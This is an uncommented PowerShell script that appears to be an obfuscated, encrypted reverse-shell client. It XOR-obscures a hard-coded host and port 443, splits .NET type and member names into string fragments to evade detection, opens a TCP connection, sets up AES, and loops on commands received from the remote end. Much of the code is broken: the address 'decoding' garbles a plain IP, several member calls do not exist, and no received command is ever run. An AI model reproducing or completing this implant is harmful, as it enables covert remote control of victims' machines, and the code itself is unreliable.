
Add-Type -AssemblyName System.Security.Cryptography


$X = 0x55 ^ 0xAA 
$IP = "10.211.55.5".ToCharArray()
$P = [BitConverter]::ToString([byte[]]@(443 -shr 8, 443 % 256)).Replace("-", "") # Port 443


Function D($a, $k) { return ($a | $k) -bxor $k }
$Y = { param($s,$k) -join ($s | % { [char](($_ -bxor $k) -band 0xFF) }) }


$DecIP = & $Y ($IP | % { [byte][char]$_ }, $X)
$DecPort = [int]"0x$(& $Y ($P.ToCharArray(), $X))"


$A = New-Object Net.Sockets.TcpClient
$B = "Cl" + "ient"
$C = "GetSt" + "ream"
$D = "Bi" + "naryWriter"
$E = "Stre" + "amReader"


$A.$B().Connect($DecIP, $DecPort)
$S = $A.$C()
$W = New-Object IO.$D($S)
$R = New-Object IO.$E($S)


$Key = New-Object byte[] 32
$rng = New-Object System.Security.Cryptography.RNGCryptoServiceProvider
$rng.GetBytes($Key)


$aes = New-Object System.Security.Cryptography.AesManaged
$aes.Key = $Key
$aes.GenerateIV()
$IV = $aes.IV


$W.Write($IV, 0, $IV.Length)
$W.Flush()


While ($true) {
Try {
        $CMD = $R.ReadLine()
If ($CMD -eq "exit") { break }
        $encryptedCMD = $aes.CreateEncryptor().TransformFinalBlock([Text.Encoding]::ASCII.GetBytes($CMD), 0, $CMD.Length)
        $W.Write($encryptedCMD, 0, $encryptedCMD.Length)
        $W.Flush()

        $Resp = $encryptedCMD | ForEach-Object { "{0:X2}" -f $_ }
        Write-Host "Encrypted Response: $Resp"

        
        $encryptedResp = New-Object byte[] 4096
        $bytesRead = $S.Read($encryptedResp, 0, $encryptedResp.Length)
        $decryptedResp = $aes.CreateDecryptor().TransformFinalBlock($encryptedResp, 0, $bytesRead)
        $Resp = [Text.Encoding]::ASCII.GetString($decryptedResp)
        $R.WriteLine($Resp)
    } catch {
        Start-Sleep -Seconds 1
        $A.$B().Close()
    }
}
